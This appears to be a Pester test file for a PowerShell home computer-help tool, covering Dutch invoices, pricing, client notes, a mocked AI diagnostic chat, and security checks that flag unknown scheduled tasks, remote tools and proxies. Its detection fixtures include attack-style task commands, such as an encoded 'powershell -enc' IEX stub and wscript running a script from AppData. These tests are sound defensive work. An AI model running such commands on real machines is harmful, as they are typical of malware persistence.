        $i = [pscustomobject]@{ number = '2026-0001'; issued_at = '2026-09-26T12:00:00Z'; seller = $seller
            client_name = 'Mevr. de Vries'; client_address = 'Dorpsstraat 1'; client_postcode_city = '1234 AB Utrecht'; client_email = $null
            lines = @([pscustomobject]@{ description = 'Arbeid: 45 min'; amount = 30 }, [pscustomobject]@{ description = 'Voorrijkosten'; amount = 15 })
            btw_mode = 'kor'; subtotal = 45; btw_amount = 0; total = 45; payment = 'pin'; due_date = $null }
        foreach ($k in $c.Keys) { $i.$k = $c[$k] }
        $i }

    It 'shows the number, the seller, the client, the costs and how it was paid' {
        $script:HcVisit.Clear(); $script:HcChanges.Clear()
        $r = New-HcReport; Set-HcFinding $r 'noAddress'; Save-HcVisit 'A1' $r
        $text = @(Get-HcInvoiceBlocks (& $invoice)) | ForEach-Object { $_.Text }
        $all = $text -join "`n"
        $text[0] | Should Be 'FACTUUR 2026-0001'
        $all | Should Match 'Shamil PC Hulp'
        $all | Should Match 'KvK 12345678'
        $all | Should Match 'Mevr\. de Vries'
        $all | Should Match 'Helemaal geen internet'
        $all | Should Match 'Betaald met pin op 26 september 2026'
        $all | Should Match 'kleineondernemersregeling'
        $total = @($text | Where-Object { $_ -like 'Totaal*' })[0]
        $total | Should Match "$euro 45,00$"
        # The amounts line up in one column.
        @($text | Where-Object { $_ -like 'Arbeid*' })[0].Length | Should Be $total.Length
    }

    It 'splits out 21% BTW, and asks for a transfer with the IBAN and number' {
        $i = & $invoice @{ btw_mode = '21'; subtotal = 37.19; btw_amount = 7.81; payment = 'transfer'; due_date = '2026-10-10' }
        $all = (@(Get-HcInvoiceBlocks $i) | ForEach-Object { $_.Text }) -join "`n"
        $all | Should Match 'Subtotaal excl\. btw'
        $all | Should Match "Btw 21%\s+$euro 7,81"
        $all | Should Match 'overmaken voor 10 oktober 2026 naar NL00BANK0123456789, onder vermelding van factuurnummer 2026-0001'
        $all | Should Not Match 'kleineondernemersregeling'
    }

    Mock Get-HcEnvironment { [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $false; Online = $true } }
    Mock Get-HcNetworkFacts { New-FakeFacts }
    $ok = { param($data) [pscustomobject]@{ Ok = $true; Status = 200; Data = $data; Error = $null } }

    It 'at Q: asks the form, makes the invoice, saves the visit with it, and shows the invoice' {
        $script:Sent = @{}
        Mock Invoke-HcRelay {
            $script:Sent[$Body.action] = $Body
            switch ($Body.action) {
                'unlock'         { & $ok ([pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }) }
                'settings_get'   { & $ok ([pscustomobject]@{ settings = [pscustomobject]@{ business_name = 'Shamil PC Hulp'; hourly_rate = 40; callout_fee = 15; btw_mode = 'unset' } }) }
                'invoice_create' { & $ok ([pscustomobject]@{ invoice = (& $invoice @{ client_name = $Body.client.name }) }) }
                default          { & $ok ([pscustomobject]@{ visits = @(); saved = $true; id = 1 }) }
            }
        }
        $out = Start-Housecall -Lang nl -Answers @('A1', '', 'Q', '123456', 'Mevr. de Vries', 'Dorpsstraat 1', '1234 AB Utrecht', '', '45', '', 'Draadloze muis 19,95', '', '1', 'j') 6>&1 | Out-String
        $lines = @($script:Sent['invoice_create'].lines)
        $lines.Count | Should Be 3
        $lines[0].description | Should Be "Arbeid: 45 min, $euro 40,00 per uur"
        $lines[0].amount | Should Be 30
        $lines[1].description | Should Be 'Voorrijkosten'
        $lines[2].description | Should Be 'Draadloze muis'
        $lines[2].amount | Should Be 19.95
        $script:Sent['invoice_create'].payment | Should Be 'pin'
        $script:Sent['visit_save'].label | Should Be 'Mevr. de Vries'
        $script:Sent['visit_save'].invoice_number | Should Be '2026-0001'
        $out | Should Match 'FACTUUR 2026-0001'
    }

    It 'without an IBAN: no bank transfer; 4 is a payment request, and no BTW line' {
        $script:Sent = @{}
        Mock Invoke-HcRelay {
            $script:Sent[$Body.action] = $Body
            switch ($Body.action) {
                'unlock'         { & $ok ([pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }) }
                'settings_get'   { & $ok ([pscustomobject]@{ settings = [pscustomobject]@{ business_name = 'Shamil'; hourly_rate = 40; callout_fee = 0; btw_mode = 'unset'; iban = $null } }) }
                'invoice_create' { & $ok ([pscustomobject]@{ invoice = (& $invoice @{ payment = $Body.payment; btw_mode = 'unset' }) }) }
                default          { & $ok ([pscustomobject]@{ visits = @(); saved = $true; id = 1 }) }
            }
        }
        # '3' (bank transfer) is not on offer without an IBAN, so it is asked again; then 4.
        $out = Start-Housecall -Lang nl -Answers @('A1', '', 'Q', '123456', 'Mevr. de Vries', '', '', '', '30', '', '3', '4', 'j') 6>&1 | Out-String
        $script:Sent['invoice_create'].payment | Should Be 'tikkie'
        $out | Should Match 'Betaling: \[1\] pin  \[2\] contant  \[4\] betaalverzoek'
        # Made when the request is sent, so it may not say paid yet.
        $out | Should Match 'Te betalen via het betaalverzoek van 26 september 2026'
        $out | Should Not Match 'Betaald via'
        $out | Should Not Match 'Btw'
    }

    It 'the window''s fields become the same invoice, and mistakes are named' {
        $settings = [pscustomobject]@{ hourly_rate = 20; callout_fee = 0; iban = $null }
        $values = @{ Name = ' Mevr. de Vries '; Address = 'Dorpsstraat 1'; Postcode = '1234 AB Utrecht'; Email = ''
            Minutes = 45; Callout = $false; Payment = 'tikkie'
            Extras = @([pscustomobject]@{ Description = 'Draadloze muis'; Amount = '19,95' }, [pscustomobject]@{ Description = $null; Amount = $null }) }
        $r = ConvertTo-HcInvoiceForm $values $settings
        $r.Error | Should Be $null
        $r.Form.Client.name | Should Be 'Mevr. de Vries'
        @($r.Form.Lines).Count | Should Be 2
        $r.Form.Lines[0].Amount | Should Be 15
        $r.Form.Lines[1].Amount | Should Be 19.95
        $r.Total | Should Be 34.95
        $r.Form.Payment | Should Be 'tikkie'

        $noName = $values.Clone(); $noName.Name = ''
        (ConvertTo-HcInvoiceForm $noName $settings).Error | Should Be 'Vul de naam van de klant in.'
        $noPay = $values.Clone(); $noPay.Payment = $null
        (ConvertTo-HcInvoiceForm $noPay $settings).Error | Should Be 'Kies hoe de klant betaalt.'
        $bad = $values.Clone(); $bad.Extras = @([pscustomobject]@{ Description = 'Muis'; Amount = 'twintig' })
        (ConvertTo-HcInvoiceForm $bad $settings).Error | Should Match '^Extra regel 1:'
        $empty = $values.Clone(); $empty.Minutes = 0; $empty.Extras = @()
        (ConvertTo-HcInvoiceForm $empty $settings).Error | Should Match 'niets te factureren'
    }

    It 'a starting price covers the first minutes; only the time after it goes by the hour' {
        $script:Lang = 'nl'
        $settings = [pscustomobject]@{ hourly_rate = 20; start_fee = 15; start_minutes = 30 }
        $short = @(Get-HcLabourLines 30 $settings)
        $short.Count | Should Be 1
        $short[0].Description | Should Be 'Arbeid 30 min: starttarief (tot 30 min)'
        $short[0].Amount | Should Be 15
        $long = @(Get-HcLabourLines 75 $settings)
        $long.Count | Should Be 2
        $long[0].Description | Should Be 'Arbeid 75 min: starttarief (tot 30 min)'
        $long[1].Description | Should Be "+ 3 x 15 min extra, $euro 5,00 per kwartier"
        # Both fit the invoice's description column (44 characters), also at 3-digit minutes.
        foreach ($l in @(Get-HcLabourLines 240 $settings)) { $l.Description.Length | Should BeLessThan 45 }
        $long[1].Amount | Should Be 15
        @(Get-HcLabourLines 0 $settings).Count | Should Be 0
        # Without a starting price: all of it by the hour, as before.
        $plain = @(Get-HcLabourLines 45 ([pscustomobject]@{ hourly_rate = 20 }))
        $plain[0].Description | Should Be "Arbeid: 45 min, $euro 20,00 per uur"
        $plain[0].Amount | Should Be 15
        # Every quarter begun counts: 50 min is 2 quarters after the first 30, EUR 25 in all.
        $fifty = @(Get-HcLabourLines 50 $settings)
        $fifty[1].Description | Should Be "+ 2 x 15 min extra, $euro 5,00 per kwartier"
        $fifty[1].Amount | Should Be 10
        Get-HcRateText $settings | Should Be "$euro 15,00 voor de eerste 30 min, daarna $euro 5,00 per begonnen kwartier"
    }

    It 'what was done by hand: on the note under done or not fixed, and in the history' {
        $script:Lang = 'nl'
        $script:HcVisit.Clear(); $script:HcChanges.Clear(); $script:HcWork.Clear()
        [void]$script:HcVisit.Add([pscustomobject]@{ Code = 'A1'; FindingId = $null; FindingArgs = @() })
        @(Get-HcWorkPresets).Count | Should BeGreaterThan 10
        (Get-HcWorkPresets) -contains ('Printer ge' + [char]0xEF + 'nstalleerd') | Should Be $true
        Add-HcWorkItem ' Printer   geinstalleerd ' $true | Should Be $true
        Add-HcWorkItem 'Printer geinstalleerd' $false | Should Be $false
        Add-HcWorkItem '  ' $true | Should Be $false
        Add-HcWorkItem 'Onderdeel moet besteld worden' $false | Should Be $true
        $text = @(Get-HcVisitBlocks | ForEach-Object { $_.Text })
        ($text -contains 'Printer geinstalleerd') | Should Be $true
        ($text -contains 'Nog niet opgelost') | Should Be $true
        ($text -contains 'Onderdeel moet besteld worden') | Should Be $true
        ($text -contains 'Er is niets veranderd aan deze pc.') | Should Be $false
        (@(Get-HcVisitChanges) -contains 'Niet opgelost: Onderdeel moet besteld worden') | Should Be $true
        # The question typed in the window replaces the list of problems checked.
        ($text -contains (T 'problem.A1')) | Should Be $true
        $script:HcAsked = 'Printer doet het niet sinds de verhuizing'
        $text = @(Get-HcVisitBlocks | ForEach-Object { $_.Text })
        ($text -contains 'Printer doet het niet sinds de verhuizing') | Should Be $true
        ($text -contains (T 'problem.A1')) | Should Be $false
        $script:HcAsked = ''
        $script:HcWork.Clear(); $script:HcVisit.Clear()
    }

    It 'the clock: minutes since the start, yellow once the starting price is used up' {
        $script:Lang = 'nl'
        $script:HcStartMinutes = 30
        $start = $script:HcStartedAt
        $script:HcStartedAt = [datetime]'2026-09-26 14:05'
        $c = Get-HcClockLine ([datetime]'2026-09-26 14:40')
        $c.Text | Should Be 'Bezig sinds 14:05, 35 min: het starttarief (30 min) is op, vraag de klant of u verder mag'
        $c.Over | Should Be $true
        $c = Get-HcClockLine ([datetime]'2026-09-26 14:20')
        $c.Text | Should Be 'Bezig sinds 14:05, 15 min'
        $c.Over | Should Be $false
        # No starting price: never a warning.
        $script:HcStartMinutes = 0
        (Get-HcClockLine ([datetime]'2026-09-26 16:05')).Over | Should Be $false
        $script:HcStartMinutes = 30
        $script:HcStartedAt = $start
    }

    It 'the drawn invoice: layout B on A4, the work with ticks, more pages when it is long' {
        $script:Lang = 'nl'
        $script:HcVisit.Clear(); $script:HcChanges.Clear(); $script:HcWork.Clear()
        [void]$script:HcVisit.Add([pscustomobject]@{ Code = 'C1'; FindingId = $null; FindingArgs = @() })
        $script:HcAsked = 'Printer doet het niet sinds de verhuizing'
        [void](Add-HcWorkItem 'Printer geinstalleerd' $true)
        [void](Add-HcWorkItem 'Onderdeel moet besteld worden' $false)
        $i = & $invoice @{ btw_mode = 'unset'; payment = 'tikkie' }
        $pages = @(Get-HcInvoiceLayout $i)
        $pages.Count | Should Be 1
        $texts = @($pages[0] | Where-Object { $_.Kind -eq 'text' } | ForEach-Object { $_.Text })
        ($texts -contains 'Factuur') | Should Be $true
        ($texts -contains 'BETREFT') | Should Be $true
        ($texts -contains 'Printer doet het niet sinds de verhuizing') | Should Be $true
        ($texts -contains 'Computerhulp aan huis') | Should Be $true
        ($texts -contains 'Onderdeel moet besteld worden (nog niet opgelost)') | Should Be $true
        ($texts -contains "$euro 45,00") | Should Be $true
        ($texts -contains 'Pagina 1 van 1') | Should Be $true
        @($pages[0] | Where-Object { $_.Kind -eq 'check' }).Count | Should Be 1
        @($pages[0] | Where-Object { $_.Kind -eq 'dash' }).Count | Should Be 1
        # Everything stays on the page, left to right and top to bottom.
        foreach ($s in @($pages[0] | Where-Object { $_.Kind -eq 'text' })) {
            ($s.X + $s.W) | Should Not BeGreaterThan 730
            $s.Y | Should BeLessThan 1123
        }
        # The text version (tests, no desktop) says the same.
        $all = (@(Get-HcInvoiceBlocks $i) | ForEach-Object { $_.Text }) -join "`n"
        $all | Should Match 'Printer doet het niet sinds de verhuizing'
        $all | Should Match 'Computerhulp aan huis'

        for ($n = 0; $n -lt 45; $n++) { [void](Add-HcWorkItem "Taak nummer $n" $true) }
        $pages = @(Get-HcInvoiceLayout $i)
        $pages.Count | Should Be 2
        (@($pages[1] | Where-Object { $_.Kind -eq 'text' } | ForEach-Object { $_.Text }) -contains 'Pagina 2 van 2') | Should Be $true
        $script:HcWork.Clear(); $script:HcVisit.Clear(); $script:HcAsked = ''
    }

    It 'Enter at the code: no invoice, no second question, the plain note' {
        $script:Sent = @{}
        Mock Invoke-HcRelay { $script:Sent[$Body.action] = $Body; & $ok ([pscustomobject]@{}) }
        $out = Start-Housecall -Lang nl -Answers @('A1', '', 'Q', '', 'extra') 6>&1 | Out-String
        $script:Sent.Count | Should Be 0
        $out | Should Match 'Waar u hulp bij vroeg'
        $out | Should Not MatchExactly 'FACTUUR'
    }

    It 'without invoice settings: says so, and shows the note' {
        $script:HcToken = $null
        Mock Invoke-HcRelay {
            if ($Body.action -eq 'unlock') { return & $ok ([pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }) }
            & $ok ([pscustomobject]@{ settings = $null; visits = @() })
        }
        $out = Start-Housecall -Lang nl -Answers @('A1', '', 'Q', '123456', '') 6>&1 | Out-String
        $out | Should Match 'setup-invoice\.ps1'
        $out | Should Match 'Waar u hulp bij vroeg'
    }

    It 'deletes a visit from the history after a yes, and says the invoice is kept' {
        $script:HcToken = 't.s'; $script:HcTokenExpires = (Get-Date).AddHours(1)
        $script:Deleted = $null
        Mock Invoke-HcRelay {
            if ($Body.action -eq 'visit_delete') { $script:Deleted = $Body.id; return & $ok ([pscustomobject]@{ deleted = 1 }) }
            if ($script:Deleted) { return & $ok ([pscustomobject]@{ visits = @() }) }
            & $ok ([pscustomobject]@{ visits = @([pscustomobject]@{ id = 7; visited_at = '2026-09-26T12:00:00Z'; label = 'Mevr. de Vries'; problems = @(); changes = @(); invoice_number = '2026-0001' }) })
        }
        $script:HcInputQueue = New-Object System.Collections.Queue
        foreach ($a in @('1', 'j', '')) { $script:HcInputQueue.Enqueue($a) }
        $out = Show-HcHistory ([pscustomobject]@{ Online = $true; Os = 'x'; IsAdmin = $false; PSVersion = [version]'5.1' }) 6>&1 | Out-String
        $script:HcInputQueue = $null
        $script:Deleted | Should Be 7
        $out | Should Match 'factuur 2026-0001'
        $out | Should Match 'Factuur 2026-0001 blijft bewaard'
    }
}

Describe 'The AI chat' {
    $script:Lang = 'en'
    Mock Get-HcEnvironment { [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $false; Online = $true } }
    $printers = [pscustomobject]@{ Now = Get-Date; SpoolerRunning = $true; SpoolerDisabled = $false; Jobs = @()
        Printers = @(
            [pscustomobject]@{ Name = 'Microsoft Print to PDF'; Default = $true; Virtual = $true; Offline = $false; State = 0; HostAddress = $null; Reachable = $null }
            [pscustomobject]@{ Name = 'HP DeskJet 2700'; Default = $false; Virtual = $false; Offline = $false; State = 0; HostAddress = $null; Reachable = $null }) }
    Mock Get-HcPrinterFacts { $printers }

    # A scripted Claude: first it runs C1, then it answers.
    $toolUse = '[{"type":"thinking","thinking":"","signature":"sig-1"},{"type":"tool_use","id":"tu_1","name":"run_check","input":{"code":"C1","input":""}}]'
    $answer = '[{"type":"tool_use","id":"tu_2","name":"give_answer","input":{"summary":"Documents go to Print to PDF.","confidence":"high","problem_code":"C1","fix_ids":["setDefault","formatDisk"],"steps":["Print again."]}}]'
    $reply = { param($json) [pscustomobject]@{ Ok = $true; Status = 200; Error = $null; Data = [pscustomobject]@{ stop_reason = 'tool_use'; content_json = $json; content = ($json | ConvertFrom-Json) } } }

    It 'runs the check the AI asks for, sends back its result, and returns the answer' {
        $script:HcToken = 't.s'; $script:HcTokenExpires = (Get-Date).AddHours(1)
        $script:Requests = New-Object System.Collections.ArrayList
        Mock Invoke-HcRelay {
            [void]$script:Requests.Add((ConvertTo-Json -InputObject $Body -Depth 30 -Compress))
            if ($script:Requests.Count -eq 1) { & $reply $toolUse } else { & $reply $answer }
        }
        $state = Invoke-HcAiConversation 'my printer does nothing'
        $state.Answer.problem_code | Should Be 'C1'
        $state.Reports.ContainsKey('C1') | Should Be $true
        $script:Requests.Count | Should Be 2
        $second = $script:Requests[1] | ConvertFrom-Json
        @($second.messages).Count | Should Be 3
        # The thinking block goes back exactly as it came.
        $second.messages[1].content_json | Should Be $toolUse
        $results = $second.messages[2].content_json | ConvertFrom-Json
        @($results)[0].tool_use_id | Should Be 'tu_1'
        @($results)[0].content | Should Match 'Offered fixes:'
        @($results)[0].content | Should Match 'setDefault'
        # The first message names the language and carries the problem.
        (($second.messages[0].content_json | ConvertFrom-Json)[0].text) | Should Be "[en]`nmy printer does nothing"
    }

    It 'only offers fixes the check itself offered, in the AI''s order' {
        $r = New-HcReport
        Add-HcAction $r 'clearJobs'; Add-HcAction $r 'setDefault' @{ Label = 'HP'; Name = 'HP' }; Add-HcAction $r 'restartSpooler'
        Select-HcActions $r @('setDefault', 'formatDisk', 'clearJobs')
        @($r.Actions | ForEach-Object { $_.FixId }) | Should Be @('setDefault', 'clearJobs')
    }

    It 'stops at the limit of checks and tells the AI so' {
        $script:HcToken = 't.s'; $script:HcTokenExpires = (Get-Date).AddHours(1)
        $script:Requests = New-Object System.Collections.ArrayList
        Mock Invoke-HcRelay { [void]$script:Requests.Add($Body); & $reply $toolUse }
        $script:AiMaxChecks = 2
        $state = Invoke-HcAiConversation 'x'
        $script:AiMaxChecks = 6
        $state.Answer | Should Be $null
        $last = ($script:Requests[-1].messages[-1].content_json | ConvertFrom-Json)
        @($last)[0].is_error | Should Be $true
    }

    It 'runs from the menu: code, problem, check, answer, then the AI''s fix through Wat nu?' {
        $script:Requests = New-Object System.Collections.ArrayList
        Mock Invoke-HcRelay {
            if ($Body.action -eq 'unlock') { return [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }; Error = $null } }
            if ($Body.action -ne 'chat') { return [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ visits = @() }; Error = $null } }
            [void]$script:Requests.Add($Body)
            if ($script:Requests.Count -eq 1) { & $reply $toolUse } else { & $reply $answer }
        }
        Mock Invoke-HcActionMenu { $script:Offered = @($Report.Actions | ForEach-Object { $_.FixId }); 'back' }
        Start-Housecall -Lang en -Answers @('?', '123456', 'my printer does nothing', '', 'Q', '')
        $script:Requests.Count | Should Be 2
        $script:Offered | Should Be @('setDefault')
    }

    It 'explains a relay problem instead of failing' {
        $script:HcToken = 't.s'; $script:HcTokenExpires = (Get-Date).AddHours(1)
        Mock Invoke-HcRelay { [pscustomobject]@{ Ok = $false; Status = 0; Data = $null; Error = 'unreachable' } }
        { Start-Housecall -Lang nl -Answers @('?', 'geen geluid meer', '', 'Q') } | Should Not Throw
        (Invoke-HcAiConversation 'x').Error | Should Be 'unreachable'
        Get-HcRelayMessage 'unreachable' | Should Match 'Supabase'
    }
}

Describe 'Fixes offered by the checks' {
    $script:Lang = 'en'
    $task = { param($name, $command, $level = 'weak', $disabled = $false)
        [pscustomobject]@{ Name = $name; Path = '\'; Command = $command; Level = $level; Disabled = $disabled
                           Owner = Get-HcKnownTaskOwner $name $command } }

    It 'offers to disable an unknown task, with its name and folder' {
        $r = Test-HcSecurity (New-FakeSecurity @{ Tasks = @(& $task 'Updater' 'wscript.exe C:\Users\x\AppData\Roaming\u.vbs') }) @('tasks') 'cleanCall'
        @($r.Actions).Count | Should Be 1
        $r.Actions[0].FixId | Should Be 'disableTask'
        $r.Actions[0].Target.Name | Should Be 'Updater'
        $r.Actions[0].Target.Path | Should Be '\'
    }

    It 'recognises Shamil''s own tools by name and script, and offers nothing for them' {
        $reveille = & $task 'ReveilleAgent' 'wscript.exe "C:\Users\shami\AppData\Local\Reveille\start-agent-hidden.vbs"'
        $courier = & $task 'CourierAgent' 'wscript.exe "C:\Users\shami\AppData\Local\Courier\start-agent-hidden.vbs"'
        $r = Test-HcSecurity (New-FakeSecurity @{ Tasks = @($reveille, $courier) }) @('tasks') 'cleanCall'
        @($r.Results | Where-Object { $_.Status -ne 'ok' }).Count | Should Be 0
        @($r.Actions).Count | Should Be 0
        $r.FindingId | Should Be 'cleanCall'
    }

    It 'does not trust a look-alike name that runs something else' {
        Get-HcKnownTaskOwner 'ReveilleAgent' 'powershell.exe -enc SQBFAFgA' | Should Be $null
        Get-HcKnownTaskOwner 'Updater' 'wscript.exe C:\Users\x\AppData\Local\Reveille\start-agent-hidden.vbs' | Should Be $null
    }

    It 'shows a disabled task as fine' {
        $r = Test-HcSecurity (New-FakeSecurity @{ Tasks = @(& $task 'Updater' 'wscript.exe u.vbs' 'weak' $true) }) @('tasks') 'cleanCall'
        $r.Results[0].Status | Should Be 'ok'
        @($r.Actions).Count | Should Be 0
    }

    It 'offers to close a running remote tool, and to turn off a proxy' {
        $tool = New-FakeTool -Running $true
        $tool | Add-Member Processes @('AnyDesk')
        $r = Test-HcSecurity (New-FakeSecurity @{ RemoteTools = @($tool); Proxy = '1.2.3.4:80' }) @('remote', 'proxy') 'cleanAll'
        @($r.Actions | ForEach-Object { $_.FixId }) | Should Be @('stopRemote', 'proxyOff')
        $r.Actions[0].Target.Processes | Should Be @('AnyDesk')
    }

    It 'offers the network fixes where they help' {
        @((Test-HcInternet (New-FakeFacts @{ DnsOk = $false; Web = $null })).Actions)[0].FixId | Should Be 'flushDns'
        @((Test-HcInternet (New-FakeFacts @{ IPv4 = '169.254.1.1'; InternetMs = $null })).Actions)[0].FixId | Should Be 'renewIp'
        @((Test-HcInternet (New-FakeFacts)).Actions).Count | Should Be 0
    }

    It 'has a label and note for every fix, in both languages' {
        foreach ($lang in @('en', 'nl')) {
            foreach ($id in $script:Fixes.Keys) {
                $script:Strings[$lang]["fix.$id"] | Should Not BeNullOrEmpty
                $script:Strings[$lang]["fix.$id.done"] | Should Not BeNullOrEmpty
                $script:Strings[$lang]['fix.note.' + $script:Fixes[$id].Note] | Should Not BeNullOrEmpty
            }
        }
    }
}

Describe 'Step-by-step guides' {
    It 'has the same number of steps in English and Dutch for every guide' {
        foreach ($key in @($script:Strings.en.Keys | Where-Object { $_ -like 'steps.*' })) {
            $en = @($script:Strings.en[$key] -split '\s*\|\s*')
            $nl = @($script:Strings.nl[$key] -split '\s*\|\s*')
            "$key $($en.Count)" | Should Be "$key $($nl.Count)"
        }
    }

    It 'has a guide for every finding except the all-clear ones' {
        $ids = @($script:Strings.en.Keys | Where-Object { $_ -like 'finding.*' } | ForEach-Object { $_.Substring(8) })
        $missing = @($ids | Where-Object { $_ -notin @('allGood', 'cleanAll') -and -not $script:Strings.en.ContainsKey("steps.$_") })
        $missing -join ', ' | Should Be ''
    }

    It 'fills the finding''s name into its steps' {
        $script:Lang = 'nl'
        $r = New-HcReport
        Set-HcFinding $r 'unknownTask' @('Updater')
        (Get-HcSteps $r)[0] | Should Match '"Updater"'
        $script:Lang = 'en'
    }

    It 'shows steps one at a time and stops on 0' {
        $script:HcInputQueue = New-Object System.Collections.Queue
        foreach ($a in @('', '0', 'extra')) { $script:HcInputQueue.Enqueue($a) }
        Show-HcSteps @('one', 'two', 'three', 'four')
        $script:HcInputQueue.Count | Should Be 1     # two answers used: Enter, then 0
        $script:HcInputQueue = $null
    }
}

Describe 'Fix, check again, undo (scripted run)' {
    $unknown = [pscustomobject]@{ Name = 'Updater'; Path = '\'; Command = 'wscript.exe u.vbs'; Level = 'weak'; Disabled = $false; Owner = $null }
    Mock Get-HcEnvironment {
        [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $false; Online = $true }
    }
    Mock Disable-ScheduledTask { $script:TaskDisabled = $true }
    Mock Enable-ScheduledTask { $script:TaskDisabled = $false }
    Mock Get-HcSecurityFacts {
        $t = $unknown.PSObject.Copy()
        $t.Disabled = [bool]$script:TaskDisabled
        New-FakeSecurity @{ Tasks = @($t) }
    }

    It 'disables the task after a yes, shows it fixed, and undoes it with U' {
        $script:TaskDisabled = $false
        Start-Housecall -Lang nl -Answers @('F2', '1', 'j', '', 'U', 'j', 'Q')
        Assert-MockCalled Disable-ScheduledTask -Times 1 -Exactly -Scope It -ParameterFilter { $TaskName -eq 'Updater' -and $TaskPath -eq '\' }
        Assert-MockCalled Get-HcSecurityFacts -Times 2 -Exactly -Scope It      # once, then again as proof
        Assert-MockCalled Enable-ScheduledTask -Times 1 -Exactly -Scope It
        $script:TaskDisabled | Should Be $false
        $script:HcChanges.Count | Should Be 0
    }

    It 'changes nothing on N' {
        Start-Housecall -Lang en -Answers @('F2', '1', 'n', '', 'Q')
        Assert-MockCalled Disable-ScheduledTask -Times 0 -Exactly -Scope It
    }

    It 'changes nothing in a dry run, even after a yes' {
        Start-Housecall -Lang en -DryRun -Answers @('F2', '1', 'y', '', 'Q')
        Assert-MockCalled Disable-ScheduledTask -Times 0 -Exactly -Scope It
    }

    It 'refuses an admin fix without admin and explains how' {
        Mock Get-HcNetworkFacts { New-FakeFacts @{ IPv4 = '169.254.1.1'; InternetMs = $null } }
        Mock ipconfig.exe { }
        Start-Housecall -Lang en -Answers @('A1', '1', '', 'Q')
        Assert-MockCalled ipconfig.exe -Times 0 -Exactly -Scope It
    }
}

Describe 'The client note' {
    $script:Lang = 'nl'

    It 'is empty when no problem was opened' {
        $script:HcVisit.Clear(); $script:HcChanges.Clear()
        @(Get-HcNoteBlocks).Count | Should Be 0
    }

    It 'says what was asked, found and done, in the client''s language' {
        $script:HcVisit.Clear(); $script:HcChanges.Clear()
        $r = New-HcReport; Set-HcFinding $r 'cleanCall'
        Save-HcVisit 'F2' $r
        [void]$script:HcChanges.Add([pscustomobject]@{ FixId = 'disableTask'; Target = @{}; Label = 'Geplande taak "Updater" uitschakelen' })
        $text = @(Get-HcNoteBlocks ([datetime]'2026-09-26')) | ForEach-Object { "$($_.Style): $($_.Text)" }
        $text[0] | Should Be 'title: Housecall, 26 september 2026'
        $text -contains 'heading: Waar u hulp bij vroeg' | Should Be $true
        $text -contains 'text: Iemand belde mij en kwam in mijn computer' | Should Be $true
        $text -contains 'text: Geplande taak "Updater" uitschakelen' | Should Be $true
        $text[-1] | Should Match '^small: Dit briefje wordt nergens bewaard'
    }

    It 'keeps only the latest finding per problem' {
        $script:HcVisit.Clear()
        $before = New-HcReport; Set-HcFinding $before 'unknownTask' @('Updater')
        $after = New-HcReport; Set-HcFinding $after 'cleanCall'
        Save-HcVisit 'F2' $before
        Save-HcVisit 'F2' $after
        $script:HcVisit.Count | Should Be 1
        $script:HcVisit[0].FindingId | Should Be 'cleanCall'
    }

    It 'says nothing changed, and shows the contact line only when one is set' {
        $saved = $script:Contact
        $script:HcVisit.Clear(); $script:HcChanges.Clear()
        $r = New-HcReport; Set-HcFinding $r 'allGood'
        Save-HcVisit 'A1' $r
        $script:Contact = @()
        $texts = @(Get-HcNoteBlocks | ForEach-Object { $_.Text })
        $texts -contains 'Er is niets veranderd aan deze pc.' | Should Be $true
        $texts -contains 'Vragen?' | Should Be $false
        $script:Contact = @('Shamil: +31 6 00000000', 'test@example.com')
        $texts = @(Get-HcNoteBlocks | ForEach-Object { $_.Text })
        $texts -contains 'Vragen?' | Should Be $true
        $texts -contains 'Shamil: +31 6 00000000' | Should Be $true
        $texts -contains 'test@example.com' | Should Be $true
        $script:Contact = $saved
    }

    It 'carries Shamil''s email, and no phone number (the repo is public)' {
        @($script:Contact) | Should Be @('Shamil: shamilimanuel@outlook.com')
        (@($script:Contact) -join ' ') | Should Not Match '\+?\d[\d ]{7,}'
    }
}

Describe 'A copy on a USB stick' {
    $online = [pscustomobject]@{ Online = $true }
    It 'warns when GitHub has a newer build, and stays quiet otherwise' {
        $script:Lang = 'nl'
        $script:HcFromFile = $true; $script:HcBuild = 'aaaaaaaaaaaa'
        Mock Invoke-WebRequest { [pscustomobject]@{ Content = "bbbbbbbbbbbb`n" } }
        Get-HcOutdatedWarning $online | Should Match 'verouderd'
        Mock Invoke-WebRequest { [pscustomobject]@{ Content = "aaaaaaaaaaaa`n" } }
        Get-HcOutdatedWarning $online | Should Be $null
        # Through irm | iex it is always the newest: no check at all.
        $script:HcFromFile = $false
        Mock Invoke-WebRequest { throw 'should not be called' }
        Get-HcOutdatedWarning $online | Should Be $null
        # Offline, or no answer: it cannot tell, so it says nothing.
        $script:HcFromFile = $true
        Get-HcOutdatedWarning ([pscustomobject]@{ Online = $false }) | Should Be $null
        Get-HcOutdatedWarning $online | Should Be $null
        $script:HcFromFile = $false; $script:HcBuild = 'dev'
    }
}

Describe 'Offline at the start, internet fixed during the visit' {
    Mock Get-HcEnvironment {
        [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $true; Online = $false }
    }
    Mock Get-HcNetworkFacts {
        $script:FactsCalls++
        if ($script:FactsCalls -eq 1) { New-FakeFacts @{ IPv4 = '169.254.12.40'; Gateway = $null; InternetMs = -1; DnsOk = $false; Web = 'failed' } }
        else { New-FakeFacts }
    }
    Mock New-HcRestorePoint { }
    Mock Test-HcOnline { $true }

    It 'measures again after the fix, so Q still asks the code for the invoice' {
        $script:FactsCalls = 0
        $renew = $script:Fixes.renewIp.Apply
        $script:Fixes.renewIp.Apply = { param($t) }
        try {
            $out = Start-Housecall -Lang nl -Answers @('A1', '1', 'j', '', 'Q', '') 6>&1 | Out-String
        } finally { $script:Fixes.renewIp.Apply = $renew }
        $out | Should Match 'Internet bereikbaar'
        Assert-MockCalled Test-HcOnline -Times 1
